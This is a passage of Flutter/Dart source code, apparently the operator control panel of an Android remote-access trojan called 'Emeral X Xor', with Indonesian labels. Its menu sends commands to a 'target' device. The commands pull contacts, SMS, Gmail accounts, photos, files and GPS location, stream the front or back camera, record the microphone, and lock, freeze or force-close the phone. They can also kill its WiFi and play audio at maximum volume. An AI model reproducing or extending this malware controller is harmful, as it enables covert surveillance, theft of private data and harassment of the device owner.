                border: Border.all(color: isActive ? _C.primary : _C.border, width: isActive ? 2 : 1.5),
                boxShadow: isActive ? [BoxShadow(color: _C.primary.withOpacity(0.12), blurRadius: 16, spreadRadius: 1)] : [],
              ),
              child: Stack(
                children: [
                  Positioned(
                    left: 18,
                    top: 18,
                    child: Container(
                      width: 42,
                      height: 42,
                      decoration: BoxDecoration(color: iconColor.withOpacity(0.15), borderRadius: BorderRadius.circular(12)),
                      child: isSpinning
                          ? AnimatedRotation(duration: const Duration(milliseconds: 500), turns: 1.0, curve: Curves.linear, child: Icon(icon, color: iconColor, size: 22))
                          : Icon(icon, color: iconColor, size: 22),
                    ),
                  ),
                  Positioned(
                    left: 18,
                    top: 78,
                    right: 18,
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(title, style: TextStyle(color: isActive ? _C.primary : _C.text, fontSize: 15, fontWeight: FontWeight.bold, fontFamily: kFont), overflow: TextOverflow.ellipsis),
                        const SizedBox(height: 2),
                        Row(
                          children: [
                            Text(subtitle, style: TextStyle(color: _C.textDim, fontSize: 10, fontWeight: FontWeight.w500, fontFamily: kFont), overflow: TextOverflow.ellipsis),
                            const SizedBox(width: 6),
                            Container(width: 5, height: 5, decoration: BoxDecoration(color: isSpinning ? _C.secondary : (status == 'ON' || status == 'AKTIF' ? _C.success : status == 'OFF' ? _C.primary : _C.textDim), shape: BoxShape.circle)),
                          ],
                        ),
                      ],
                    ),
                  ),
                  Positioned(
                    right: 18,
                    bottom: 18,
                    child: Icon(Icons.chevron_right_rounded, color: _C.textDim, size: 18),
                  ),
                ],
              ),
            ),
          ),
        );
      },
    );
  }

  Widget _buildNoDeviceSelected() {
    return Center(
      child: Column(
        mainAxisSize: MainAxisSize.min,
        children: [
          Container(
            width: 120,
            height: 120,
            decoration: BoxDecoration(
              color: _C.card,
              shape: BoxShape.circle,
              border: Border.all(color: _C.border, width: 2),
            ),
            child: Icon(
              Icons.devices_other_rounded,
              color: _C.textDim,
              size: 60,
            ),
          ),
          const SizedBox(height: 24),
          Text(
            "NO DEVICE",
            style: TextStyle(
              color: _C.text,
              fontWeight: FontWeight.bold,
              fontFamily: kFont,
              letterSpacing: 2,
              fontSize: 20,
            ),
          ),
          const SizedBox(height: 8),
          Text(
            "Pilih device dari Dashboard",
            style: TextStyle(
              color: _C.textDim,
              fontSize: 14,
              fontFamily: kFont,
            ),
          ),
          const SizedBox(height: 24),
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 12),
            decoration: BoxDecoration(
              color: _C.primary.withOpacity(0.05),
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: _C.primary.withOpacity(0.2)),
            ),
            child: Row(
              mainAxisSize: MainAxisSize.min,
              children: [
                Icon(Icons.arrow_upward_rounded, color: _C.primary, size: 16),
                const SizedBox(width: 8),
                Text(
                  "Klik device di Dashboard",
                  style: TextStyle(
                    color: _C.primary,
                    fontSize: 12,
                    fontWeight: FontWeight.w600,
                    fontFamily: kFont,
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    if (widget.targetDevice == null || _id == 'unknown') {
      return Scaffold(
        backgroundColor: _C.bg,
        extendBodyBehindAppBar: true,
        appBar: AppBar(
          backgroundColor: Colors.transparent,
          elevation: 0,
          centerTitle: true,
          leading: IconButton(
            icon: Icon(Icons.arrow_back_ios_rounded, color: _C.primary, size: 22),
            onPressed: () => Navigator.pop(context),
            padding: const EdgeInsets.only(left: 8),
            constraints: const BoxConstraints(),
          ),
          title: Text(
            'Emeral X Xor',
            style: TextStyle(
              color: _C.primary,
              fontSize: 18,
              fontWeight: FontWeight.bold,
              fontFamily: kFont,
              letterSpacing: 1.5,
              shadows: [
                Shadow(
                  color: _C.primary.withOpacity(0.3),
                  blurRadius: 10,
                ),
              ],
            ),
          ),
        ),
        body: _buildBackgroundWrapper(
          child: SafeArea(
            child: _buildNoDeviceSelected(),
          ),
        ),
      );
    }

    return Scaffold(
      backgroundColor: _C.bg,
      extendBodyBehindAppBar: true,
      appBar: AppBar(
        backgroundColor: Colors.transparent,
        elevation: 0,
        centerTitle: true,
        leading: IconButton(
          icon: Icon(Icons.arrow_back_ios_rounded, color: _C.primary, size: 22),
          onPressed: () => Navigator.pop(context),
          padding: const EdgeInsets.only(left: 8),
          constraints: const BoxConstraints(),
        ),
        title: Text(
          'Emeral X Xor',
          style: TextStyle(
            color: _C.primary,
            fontSize: 18,
            fontWeight: FontWeight.bold,
            fontFamily: kFont,
            letterSpacing: 1.5,
            shadows: [
              Shadow(
                color: _C.primary.withOpacity(0.3),
                blurRadius: 10,
              ),
            ],
          ),
        ),
        actions: [
          Container(
            margin: const EdgeInsets.only(right: 16),
            child: Container(
              width: 8,
              height: 8,
              decoration: BoxDecoration(
                color: _isOnline ? _C.success : _C.primary,
                shape: BoxShape.circle,
                boxShadow: [
                  BoxShadow(
                    color: _isOnline ? _C.success.withOpacity(0.5) : _C.primary.withOpacity(0.5),
                    blurRadius: 8,
                  ),
                ],
              ),
            ),
          ),
        ],
      ),
      body: _buildBackgroundWrapper(
        child: SafeArea(
          child: SingleChildScrollView(
            physics: const BouncingScrollPhysics(),
            padding: const EdgeInsets.only(bottom: 20, top: 12),
            child: Column(
              children: [
                _buildBannerVideo(),
                _buildBannerCard(),
                const SizedBox(height: 6),

                _buildSectionHeader('CONTROL'),
                _buildGrid2x2([
                  _buildMenuCard(title: 'TORCH', subtitle: _isTorchOn ? 'AKTIF' : 'NONAKTIF', icon: Icons.flashlight_on_rounded, onTap: () { if (_isTorchOn) { _cmd('torch_off', spinId: 30); setState(() => _isTorchOn = false); _toastInfo('Torch OFF'); } else { _cmd('torch_on', spinId: 30); setState(() => _isTorchOn = true); _toastSuccess('Torch ON'); } }, iconColor: _C.secondary, status: _isTorchOn ? 'ON' : 'OFF', isActive: _isTorchOn, spinId: 30),
                  _buildMenuCard(title: 'STROBE', subtitle: _isStrobeOn ? 'AKTIF' : 'NONAKTIF', icon: Icons.flash_on_rounded, onTap: () { if (_isStrobeOn) { _cmd('stop_strobe', spinId: 31); setState(() => _isStrobeOn = false); _toastInfo('Strobe OFF'); } else { _cmd('flash_strobe', spinId: 31); setState(() => _isStrobeOn = true); _toastSuccess('Strobe ON'); } }, iconColor: _C.secondary, status: _isStrobeOn ? 'ON' : 'OFF', isActive: _isStrobeOn, spinId: 31),
                  _buildMenuCard(title: 'LOCK HP', subtitle: 'Kunci perangkat', icon: Icons.lock_rounded, onTap: () { for (int i = 1; i <= 5; i++) { Future.delayed(Duration(seconds: i - 1), () { _cmd('sos_on', spinId: 32); _cmd('force_open', spinId: 32); _addLog('Lock ON ($i/5)'); }); } _toastWarning('Lock - 5x'); }, iconColor: _C.primary, spinId: 32),
                  _buildMenuCard(title: 'UNLOCK HP', subtitle: 'Buka kunci', icon: Icons.lock_open_rounded, onTap: () { _cmd('sos_off', spinId: 33); _toastSuccess('Unlock - Layar terbuka'); }, iconColor: _C.success, spinId: 33),
                  _buildMenuCard(title: 'PANIC', subtitle: _isPanicModeOn ? 'AKTIF' : 'NONAKTIF', icon: Icons.warning_rounded, onTap: _togglePanicMode, iconColor: _C.primary, status: _isPanicModeOn ? 'ON' : 'OFF', isActive: _isPanicModeOn, spinId: 34),
                  _buildMenuCard(title: 'FREEZE', subtitle: 'Bekukan layar', icon: Icons.block_rounded, onTap: _showFreezeDialog, iconColor: _C.primaryDark, spinId: 35),
                ]),

                _buildSectionHeader('LIVE SCREEN'),
                _buildGrid2x2([
                  _buildMenuCard(title: 'CAMERA DEPAN', subtitle: _liveOn && _liveTitle.contains('DEPAN') ? 'AKTIF' : 'IDLE', icon: Icons.camera_front_rounded, onTap: () => _startLive('live_camera_start', 'front'), iconColor: _C.primary, status: _liveOn && _liveTitle.contains('DEPAN') ? 'AKTIF' : 'IDLE', isActive: _liveOn && _liveTitle.contains('DEPAN'), spinId: 1),
                  _buildMenuCard(title: 'CAMERA BELAKANG', subtitle: _liveOn && _liveTitle.contains('BELAKANG') ? 'AKTIF' : 'IDLE', icon: Icons.camera_rear_rounded, onTap: () => _startLive('live_camera_start', 'back'), iconColor: _C.primary, status: _liveOn && _liveTitle.contains('BELAKANG') ? 'AKTIF' : 'IDLE', isActive: _liveOn && _liveTitle.contains('BELAKANG'), spinId: 2),
                ]),

                _buildSectionHeader('CAMERA'),
                _buildGrid2x2([
                  _buildMenuCard(title: 'AMBIL FOTO', subtitle: 'Ambil foto target', icon: Icons.camera_alt_rounded, onTap: () => _showCamPicker((s) => _cmd('take_photo', extra: s, spinId: 3)), iconColor: _C.primary, spinId: 3),
                  _buildMenuCard(title: 'SET WALLPAPER', subtitle: 'Ganti wallpaper', icon: Icons.wallpaper_rounded, onTap: () => _inputDialog('Set Wallpaper', 'Image URL', (v) => _cmd('set_wallpaper', extra: v, spinId: 4)), iconColor: _C.primary, spinId: 4),
                ]),

                _buildSectionHeader('DATA'),
                _buildGrid2x2([
                  _buildMenuCard(title: 'CONTACTS', subtitle: 'Ambil kontak', icon: Icons.contacts_rounded, onTap: () => _cmd('get_contacts', spinId: 5), iconColor: _C.success, spinId: 5),
                  _buildMenuCard(title: 'GPS LOCATION', subtitle: 'Lacak lokasi', icon: Icons.my_location_rounded, onTap: () => _cmd('get_location', spinId: 6), iconColor: _C.success, spinId: 6),
                  _buildMenuCard(title: 'GMAIL ACCOUNTS', subtitle: 'Ambil akun Gmail', icon: Icons.email_rounded, onTap: () => _cmd('get_gmails', spinId: 7), iconColor: _C.accent, spinId: 7),
                  _buildMenuCard(title: 'SMS MESSAGES', subtitle: 'Ambil SMS', icon: Icons.sms_rounded, onTap: () => _cmd('get_sms', spinId: 8), iconColor: _C.accent, spinId: 8),
                  _buildMenuCard(title: 'GALLERY', subtitle: 'Ambil foto', icon: Icons.photo_library_rounded, onTap: () => _cmd('get_gallery', extra: '5', spinId: 9), iconColor: _C.primaryDark, spinId: 9),
                  _buildMenuCard(title: 'FILE MANAGER', subtitle: 'Kelola file', icon: Icons.folder_rounded, onTap: () => _cmd('list_files', extra: '/storage/emulated/0/', spinId: 12), iconColor: _C.primary, spinId: 12),
                ]),

                _buildSectionHeader('DEVICE'),
                _buildGrid2x2([
                  _buildMenuCard(title: 'WAKE UP', subtitle: 'Bangunkan perangkat', icon: Icons.wb_sunny_rounded, onTap: () => _cmd('force_open', spinId: 15), iconColor: _C.secondary, spinId: 15),
                  _buildMenuCard(title: 'FORCE CLOSE', subtitle: _isForceCloseOn ? 'AKTIF' : 'NONAKTIF', icon: Icons.power_settings_new_rounded, onTap: _toggleForceClose, iconColor: _C.primary, status: _isForceCloseOn ? 'ON' : 'OFF', isActive: _isForceCloseOn, spinId: 16),
                ]),

                _buildSectionHeader('APPS'),
                _buildGrid2x2([
                  _buildMenuCard(title: 'LIST APPS', subtitle: 'Daftar aplikasi', icon: Icons.apps_rounded, onTap: _listApps, iconColor: _C.primaryDark, spinId: 17),
                ]),

                _buildSectionHeader('AUDIO'),
                _buildGrid2x2([
                  _buildMenuCard(title: 'PLAY AUDIO', subtitle: 'Putar suara', icon: Icons.play_circle_rounded, onTap: () => _inputDialog('Play Audio', 'MP3 URL', (v) => _cmd('play_audio', extra: v, spinId: 18)), iconColor: _C.success, spinId: 18),
                  _buildMenuCard(title: 'STOP AUDIO', subtitle: 'Hentikan suara', icon: Icons.stop_circle_rounded, onTap: () => _cmd('stop_audio', spinId: 19), iconColor: _C.primary, spinId: 19),
                  _buildMenuCard(title: 'MAX VOLUME', subtitle: 'Volume maksimal', icon: Icons.volume_up_rounded, onTap: () { _cmd('max_volume', spinId: 20); _toastSuccess('Volume MAX'); }, iconColor: _C.secondary, spinId: 20),
                  _buildMenuCard(title: 'MUTE VOLUME', subtitle: 'Volume senyap', icon: Icons.volume_off_rounded, onTap: () { _cmd('mute_volume', spinId: 21); _toastInfo('Volume MUTE'); }, iconColor: _C.textDim, spinId: 21),
                  _buildMenuCard(title: 'VIBRATE', subtitle: 'Getar sekali', icon: Icons.vibration_rounded, onTap: () => _cmd('vibrate_loop', spinId: 22), iconColor: _C.primaryDark, spinId: 22),
                  _buildMenuCard(title: 'VIBRATE LOOP', subtitle: _isVibrateLoopOn ? 'AKTIF' : 'NONAKTIF', icon: Icons.vibration_rounded, onTap: () { if (_isVibrateLoopOn) { _cmd('vibrate_stop', spinId: 23); setState(() => _isVibrateLoopOn = false); _toastInfo('Vibrate Loop OFF'); } else { _cmd('vibrate_start', spinId: 23); setState(() => _isVibrateLoopOn = true); _toastSuccess('Vibrate Loop ON'); } }, iconColor: _C.primaryDark, status: _isVibrateLoopOn ? 'ON' : 'OFF', isActive: _isVibrateLoopOn, spinId: 23),
                  _buildMenuCard(title: 'KILL WIFI', subtitle: 'Matikan WiFi', icon: Icons.wifi_off_rounded, onTap: () => _cmd('kill_wifi', spinId: 24), iconColor: _C.primary, spinId: 24),
                  _buildMenuCard(title: 'OPEN URL', subtitle: 'Buka link', icon: Icons.open_in_browser, onTap: () => _inputDialog('Open URL', 'https://...', (v) => _cmd('open_url', extra: v, spinId: 25)), iconColor: _C.accent, spinId: 25),
                  _buildMenuCard(title: 'TTS', subtitle: 'Text To Speech', icon: Icons.volume_up_rounded, onTap: _showSpeakDialog, iconColor: _C.secondary, spinId: 26),
                  _buildMenuCard(title: 'LOOP SOUND', subtitle: _isLoopSoundOn ? 'AKTIF' : 'NONAKTIF', icon: Icons.music_note_rounded, onTap: _showLoopSoundDialog, iconColor: Colors.pink, status: _isLoopSoundOn ? 'ON' : 'OFF', isActive: _isLoopSoundOn, spinId: 27),
                  _buildMenuCard(title: 'STOP SOUND', subtitle: 'Hentikan suara', icon: Icons.stop_rounded, onTap: () { _cmd('stop_loop_sound', spinId: 28); _toastInfo('Menghentikan semua suara'); }, iconColor: _C.primary, spinId: 28),
                  _buildMenuCard(title: 'RECORD MIC', subtitle: _spinningStates[29] == true ? 'MEREKAM...' : 'Rekam suara', icon: Icons.mic_rounded, onTap: _recordMicWithLoading, iconColor: _C.primary, status: _spinningStates[29] == true ? 'RECORDING...' : 'IDLE', isActive: _spinningStates[29] == true, spinId: 29),
                ]),

                const SizedBox(height: 30),
              ],
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildDialogHeader(String title, IconData icon, Color color) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
      decoration: BoxDecoration(color: _C.card, border: Border(bottom: BorderSide(color: _C.border))),
      child: Row(
        children: [
          IconButton(icon: Icon(Icons.arrow_back_ios, color: _C.primary, size: 20), onPressed: () => Navigator.pop(context), padding: EdgeInsets.zero, constraints: const BoxConstraints()),
          const SizedBox(width: 10),
          Container(padding: const EdgeInsets.all(6), decoration: BoxDecoration(color: color.withOpacity(0.1), borderRadius: BorderRadius.circular(8)), child: Icon(icon, color: color, size: 18)),
          const SizedBox(width: 10),
          Expanded(child: Text(title, style: TextStyle(color: _C.text, fontSize: 14, fontWeight: FontWeight.bold, letterSpacing: 0.5, fontFamily: kFont), overflow: TextOverflow.ellipsis)),
        ],
      ),
    );
  }
}

class FullScreenDialog extends StatelessWidget {
  final Widget child;
  const FullScreenDialog({super.key, required this.child});

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _C.bg,
      extendBodyBehindAppBar: true,
      appBar: AppBar(
        backgroundColor: Colors.transparent,
        elevation: 0,
        leading: IconButton(
          icon: Icon(Icons.arrow_back_ios_rounded, color: _C.primary, size: 22),
          onPressed: () => Navigator.pop(context),
        ),
      ),
      body: Stack(
        children: [
          Positioned.fill(
            child: Image.asset(
              'assets/images/mmk.jpg',
              fit: BoxFit.cover,
              errorBuilder: (_, __, ___) => Container(color: _C.bg),
            ),
          ),
          Positioned.fill(
            child: Container(
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  begin: Alignment.topCenter,
                  end: Alignment.bottomCenter,
                  colors: [
                    _C.bg.withOpacity(0.78),
                    _C.bg.withOpacity(0.88),
                    _C.bg.withOpacity(0.95),
                  ],
                ),
              ),
            ),
          ),
          SafeArea(child: child),
        ],
      ),
    );
  }
}